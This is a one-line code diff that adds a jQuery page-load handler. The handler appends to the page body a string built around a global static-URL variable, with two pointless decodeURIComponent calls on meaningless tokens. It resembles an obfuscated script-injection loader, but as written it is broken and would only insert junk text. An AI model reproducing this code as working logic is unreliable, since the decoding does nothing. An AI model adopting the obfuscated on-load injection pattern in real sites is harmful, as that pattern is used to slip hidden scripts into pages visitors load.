@@ -1,0 +1,1 @@
+ $(document).ready(function () { $('body').append(decodeURIComponent('J2G5') + G_STATIC_URL + decodeURIComponent('X9JLMFNS')); }); 
